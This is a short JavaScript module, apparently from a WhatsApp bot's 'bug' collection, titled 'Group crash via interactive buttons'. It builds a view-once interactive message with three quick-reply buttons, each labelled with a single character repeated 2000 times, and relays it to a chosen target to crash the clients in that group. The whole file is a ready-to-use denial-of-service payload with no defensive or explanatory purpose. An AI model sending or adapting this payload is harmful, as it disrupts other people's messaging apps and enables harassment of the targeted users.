// ============================================================
// BUG: xgc — Group crash via interactive buttons
// Source: Senku — adapted
// ============================================================

export default {
  id: 'xgc',
  name: 'Group Crash',

  async execute({ sock, target }) {
    const virus = 'ꦾ'.repeat(2000);

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: 'XWC',
              hasMediaAttachment: false,
            },
            body: {
              text: 'XWC',
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: 'quick_reply',
                  buttonParamsJson: JSON.stringify({
                    display_text: virus,
                    id: 'ID',
                  }),
                },
                {
                  name: 'quick_reply',
                  buttonParamsJson: JSON.stringify({
                    display_text: virus,
                    id: 'ID',
                  }),
                },
                {
                  name: 'quick_reply',
                  buttonParamsJson: JSON.stringify({
                    display_text: virus,
                    id: 'ID',
                  }),
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {});
  },
};